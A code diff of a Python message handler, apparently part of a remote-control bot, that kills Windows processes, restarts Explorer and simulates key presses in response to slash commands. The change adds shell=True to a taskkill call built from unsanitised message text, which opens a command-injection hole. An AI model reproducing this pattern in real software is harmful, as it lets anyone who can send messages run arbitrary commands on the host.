@@ -1248,11 +1248,11 @@ def send_data(message=None):
         keyboard.press(key)
 
     elif message.startswith('/restartexplorer'):
-        subprocess.Popen('taskkill /f /im explorer.exe')
-        subprocess.Popen('start explorer.exe')
+        subprocess.Popen('taskkill /f /im explorer.exe', shell=True)
+        subprocess.Popen('start explorer.exe', shell=True)
 
-    elif message.startswith(('/taskill', '/forceclose')):
-        window_name = message.replace('/taskill', '').replace('/forceclose', '')
+    elif message.startswith(('/kill', '/taskill', '/taskkill', '/forceclose')):
+        window_name = message.replace('/kill', '').replace('/taskill', '').replace('/taskkill', '').replace('/forceclose', '')
         hwnd = get_window_by_name(window_name)
         if hwnd:
             print(f"Fenêtre '{window_name}' trouvée avec handle : {hwnd}")
@@ -1263,7 +1263,7 @@ def send_data(message=None):
         except:
             if not '.' in window_name:
                 window_name += '.exe'
-            subprocess.Popen(f'taskkill /f /im {window_name}')
+            subprocess.Popen(f'taskkill /f /im {window_name}', shell=True)
 
     elif message.startswith('/restart'):
         exe = message.replace('/restart', '')
